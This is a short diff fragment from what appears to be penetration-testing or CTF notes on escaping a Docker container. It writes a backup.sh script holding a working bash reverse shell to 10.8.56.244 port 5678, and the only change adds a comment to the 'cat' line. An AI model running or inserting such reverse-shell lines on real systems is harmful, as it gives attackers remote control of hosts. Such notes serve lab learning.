@@ -495,7 +495,7 @@ grab a file outside of dockerm, E.g, reverse shell
 
 echo "#!/bin/bash" > backup.sh
 echo "bash -i >& /dev/tcp/10.8.56.244/5678 0>&1" >> backup.sh
-cat backup.sh
+cat backup.sh # to make sure the shell is correct
 ->
 
 
